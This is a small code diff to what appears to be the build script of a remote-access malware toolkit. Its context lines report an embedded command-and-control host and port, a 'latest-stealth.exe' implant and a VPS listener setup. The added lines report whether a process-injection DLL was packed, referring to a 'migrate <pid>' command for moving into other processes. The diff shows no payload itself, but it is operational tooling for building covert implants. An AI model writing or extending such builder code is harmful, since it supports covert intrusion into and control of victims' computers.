@@ -71,6 +71,11 @@ generateBuild({
     console.log('C2 (embedded):', m.host + ':' + m.port);
     console.log('File:', m.latestStealthExe || path.join(root, 'builds', 'working', 'latest-stealth.exe'));
     console.log('SHA256:', m.sha256);
+    if (m.injectDllPacked) {
+      console.log('Inject DLL: builds/working/latest-inject.dll (injectdll) or terminal: migrate <pid>');
+    } else {
+      console.warn('No inject DLL — install MinGW (mingw-w64) on builder host and rebuild.');
+    }
     if (is443SplitEnabled()) {
       console.log('VPS listens (local): 0.0.0.0:' + listenPort + ' — forward public TCP', m.port, '→', listenPort);
     } else {
